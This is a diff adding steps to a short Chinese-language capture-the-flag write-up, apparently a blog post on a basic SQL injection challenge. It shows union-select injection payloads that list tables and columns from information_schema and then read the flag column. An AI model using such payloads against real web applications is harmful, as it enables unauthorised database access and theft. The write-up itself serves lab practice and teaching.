@@ -8,3 +8,7 @@
 
 于是使用1' union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=database() #语句获取表名![](/image/basicsql1.png)
 
+而后使用1' union select 1,2,group_concat(column_name) from information_schema.columns where table_name='f1agfl4gher3' #获取字段名![](/image/basicsql2.png)
+
+最后使用1' union select 1,2,h3r31sfl4g from f1agfl4gher3 #获得flag![](/image/basicsql3.png)
+
